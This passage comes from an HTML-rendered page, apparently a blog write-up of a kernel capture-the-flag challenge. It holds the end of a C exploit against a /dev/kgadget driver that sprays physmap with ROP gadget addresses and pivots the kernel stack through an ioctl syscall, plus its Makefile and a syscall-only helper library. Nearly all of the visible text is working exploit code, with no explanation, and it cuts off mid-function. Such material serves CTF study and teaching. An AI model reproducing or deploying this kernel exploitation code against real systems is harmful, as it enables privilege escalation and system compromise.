<span class="kt">size_t</span> <span class="n">pop_rsp_ret</span>  <span class="o">=</span> <span class="mh">0xffffffff811483d0</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">add_rsp_0xC0</span> <span class="o">=</span> <span class="mh">0xffffffff81488561</span><span class="p">;</span> <span class="c1">// cat gadget.txt |grep "add rsp, 0xa8", pop x N;ret</span>
<span class="kt">void</span> <span class="nf">physmap_spary</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">size_t</span><span class="o">*</span> <span class="n">rop</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">15000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">rop</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_rsp_0xC0</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x22</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x33</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x44</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x55</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x66</span><span class="p">;</span>
                <span class="n">rop</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x77</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="n">save_status</span><span class="p">();</span>
    <span class="kt">char</span> <span class="n">procn</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/dev/kgadget"</span><span class="p">;</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>

    <span class="n">physmap_spary</span><span class="p">();</span> 
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">"mov r15, 0x1111;"</span>
        <span class="s">"mov r14, 0x2222;"</span>
        <span class="s">"mov r13, 0x3333;"</span>
        <span class="s">"mov r12, 0x4444;"</span>
        <span class="s">"mov r11, 0x5555;"</span>
        <span class="s">"mov r10, 0x6666;"</span>
        <span class="s">"mov r9,  pop_rsp_ret;"</span>
        <span class="s">"mov r8,  0xffff888000000000 + 0x6000000 + 8;"</span>
        <span class="s">"mov rcx, 0x9999;"</span>
        <span class="s">"mov rbx, 0xaaaa;"</span>
        <span class="s">"mov rdx, 0xffff888000000000+0x6000000;"</span>
        <span class="s">"mov rsi, 0x1BF52;"</span>
        <span class="s">"mov rdi, fd;"</span>
        <span class="s">"mov rax, 0x10;"</span>
        <span class="s">"syscall;"</span>
        <span class="p">);</span>


<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>


</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Makefile</li>
</ul>

<div class="language-makefile highlighter-rouge"><div class="code-header">
        <span data-label-text="Makefile"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">CC</span> <span class="o">=</span> gcc
<span class="nv">CFLAGS</span> <span class="o">=</span> <span class="nt">-nostdlib</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wl</span>,--gc-sections <span class="nt">-fpie</span> <span class="nt">-static</span> <span class="nt">-ffreestanding</span> <span class="nt">-std</span><span class="o">=</span>c++2a <span class="nt">-mno-sse</span> <span class="nt">-mno-mmx</span> <span class="nt">-mno-avx</span> <span class="nt">-masm</span><span class="o">=</span>intel

<span class="nl">exploit</span><span class="o">:</span> <span class="nf">exp.c</span>
	<span class="p">$(</span>CC<span class="p">)</span> <span class="p">$(</span>CFLAGS<span class="p">)</span> <span class="nv">$&lt;</span> <span class="nt">-o</span> <span class="nv">$@</span>


</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>minilib.h</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="cp">#define O_RDONLY    0   </span><span class="cm">/* Open read-only.  */</span><span class="cp">
#define O_WRONLY    1   </span><span class="cm">/* Open write-only.  */</span><span class="cp">
#define O_RDWR      2   </span><span class="cm">/* Open read/write.  */</span><span class="cp">
#define O_CREAT     0x40</span><span class="cm">/* New File. */</span><span class="cp">
</span>
<span class="cp">#define PROT_NONE      0
#define PROT_READ      1
#define PROT_WRITE     2
#define PROT_EXEC      4
#define PROT_GROWSDOWN 0x01000000
#define PROT_GROWSUP   0x02000000
</span>
<span class="cp">#define MAP_ANONYMOUS	0x20
#define MAP_SHARED	0x01		</span><span class="cm">/* Share changes.  */</span><span class="cp">
#define MAP_PRIVATE	0x02		</span><span class="cm">/* Changes are private.  */</span><span class="cp">
</span>
<span class="kt">size_t</span> <span class="n">environ</span><span class="p">;</span>

<span class="c1">// bind_core</span>
<span class="cp">#define MAX_CPUS 1024
</span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bits</span><span class="p">[</span><span class="n">MAX_CPUS</span> <span class="o">/</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">))];</span> <span class="p">}</span> <span class="n">cpu_set_t</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">CPU_ZERO</span><span class="p">(</span><span class="n">cpu_set_t</span> <span class="o">*</span><span class="n">set</span><span class="p">)</span> <span class="p">{</span> <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_CPUS</span> <span class="o">/</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="n">set</span><span class="o">-&gt;</span><span class="n">bits</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">CPU_SET</span><span class="p">(</span><span class="kt">int</span> <span class="n">core</span><span class="p">,</span> <span class="n">cpu_set_t</span> <span class="o">*</span><span class="n">set</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">core</span> <span class="o">/</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">core</span> <span class="o">%</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span>
    <span class="n">set</span><span class="o">-&gt;</span><span class="n">bits</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">|=</span> <span class="p">(</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">offset</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">syscall64</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov rax, rdi;"</span>
        <span class="s">"mov rdi, rsi;"</span>
        <span class="s">"mov rsi, rdx;"</span>
        <span class="s">"mov rdx, rcx;"</span>
        <span class="s">"mov r10, r8 ;"</span>
        <span class="s">"mov r8 , r9 ;"</span>
        <span class="s">"mov r9 , [rsp + 8];"</span>
        <span class="s">"syscall;"</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="kt">size_t</span> <span class="nf">mmap</span><span class="p">(){</span>
    <span class="c1">// size_t addr, size_t len, size_t prot, size_t flags, int fd, size_t offset</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov rax, 0x9;"</span>
        <span class="s">"mov r10, rcx;"</span>
        <span class="s">"syscall;"</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="c1">//void *mmap(void *addr, size_t length, int prot, int flags, int fd, long int offset) {</span>
<span class="c1">//    return (void *)syscall64(9, addr, length, prot, flags, fd, offset);</span>
<span class="c1">//}</span>
<span class="kt">int</span> <span class="nf">open</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span><span class="kt">int</span> <span class="n">prot</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="n">prot</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">ioctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">size_t</span> <span class="nf">execve</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="kt">size_t</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">environ</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">environ</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">sendfile</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">dst_fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">src_fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">){</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">dst_fd</span><span class="p">,</span> <span class="n">src_fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">chmod</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span><span class="kt">int</span> <span class="n">mode</span><span class="p">){</span> <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x5a</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">fork</span><span class="p">(){</span><span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">57</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="nf">getuid</span><span class="p">(){</span><span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x66</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="nf">getpid</span><span class="p">(){</span><span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x27</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">sched_setaffinity</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cpusetsize</span><span class="p">,</span> <span class="k">const</span> <span class="n">cpu_set_t</span> <span class="o">*</span><span class="n">cupset</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0xcb</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">cpusetsize</span><span class="p">,</span> <span class="n">cupset</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">bind_core</span><span class="p">(</span><span class="kt">int</span> <span class="n">core</span><span class="p">){</span>
    <span class="n">cpu_set_t</span> <span class="n">cpu_set</span><span class="p">;</span>
    <span class="n">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu_set</span><span class="p">);</span>
    <span class="n">CPU_SET</span><span class="p">(</span><span class="n">core</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cpu_set</span><span class="p">);</span>
    <span class="n">sched_setaffinity</span><span class="p">(</span><span class="n">getpid</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cpu_set</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cpu_set</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">system</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">environ</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">puts</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">Str</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">length</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">Str</span><span class="p">[</span><span class="n">length</span><span class="p">]</span><span class="o">!=</span><span class="mi">0</span><span class="p">){</span><span class="o">++</span><span class="n">length</span><span class="p">;}</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">Str</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">hex</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">IntHex</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="mh">0x18</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0123456789ABCDEF"</span><span class="p">[</span><span class="n">IntHex</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">];</span>
        <span class="n">IntHex</span> <span class="o">&gt;&gt;=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">IntHex</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="sc">'0'</span><span class="p">;</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="sc">'x'</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">idx</span><span class="o">--</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">lss</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">Str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">IntHex</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">length</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">Str</span><span class="p">[</span><span class="n">length</span><span class="p">]</span><span class="o">!=</span><span class="mi">0</span><span class="p">){</span><span class="o">++</span><span class="n">length</span><span class="p">;}</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">Str</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"</span><span class="se">\t</span><span class="s"> = "</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">IntHex</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">hex_num</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">IntHex</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">idx</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0123456789ABCDEF"</span><span class="p">[</span><span class="n">IntHex</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">];</span>
        <span class="n">IntHex</span> <span class="o">&gt;&gt;=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="n">idx</span><span class="o">--</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x18</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">byte_to_long</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">byte_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">byte_len</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">byte_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">byte_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">value</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="n">value</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">b</span><span class="p">[</span><span class="n">byte_len</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>


<span class="c1">// strings.h</span>
<span class="kt">void</span> <span class="nf">strncpy</span><span class="p">(</span><span class="kt">char</span> <span class="n">dst</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">src</span><span class="p">[],</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">){</span>
    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\x00'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">strcat</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">src</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">dest</span><span class="p">)</span>
        <span class="n">dest</span><span class="o">++</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">((</span><span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span>
        <span class="p">;</span>
    <span class="k">return</span> <span class="n">tmp</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span> <span class="nf">malloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">memset</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">xs</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">--</span><span class="p">)</span>
        <span class="o">*</span><span class="n">xs</span><span class="o">++</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">char</span> <span class="o">*</span> <span class="nf">repeat</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">n</span><span class="p">){</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">hexdump</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="k">const</span> <span class="kt">size_t</span> <span class="n">row_size</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">row_size</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">hex_num</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
